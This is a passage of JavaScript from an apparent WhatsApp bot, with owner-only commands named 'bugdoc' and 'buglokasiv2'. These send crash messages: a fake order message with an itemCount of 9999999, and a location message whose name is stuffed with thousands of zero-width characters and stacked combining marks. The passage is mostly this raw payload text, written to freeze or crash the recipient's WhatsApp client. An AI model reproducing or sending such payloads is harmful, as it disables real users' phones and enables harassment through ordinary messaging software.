   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'zoe️',
    orderTitle: 'bugdoc〽', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${ngazap(prefix)}.txt`, mimetype: 'application/txt'})
break
case 'buglokasiv2':
       if (!dev.key.fromMe && !isOwner) return
zoe.updatePresence(from, Presence.composing)
		       var bro = await getBuffer('./src/logo1.jpg')
                     zoe.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: '🔥zoe͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏     ̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̘͇͙̟̫͎͎̹̹̍̐̿̈́̈́͊͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̘͇͙̟̫͎͎̹̹̍̐̿̈́̈́͊ ',
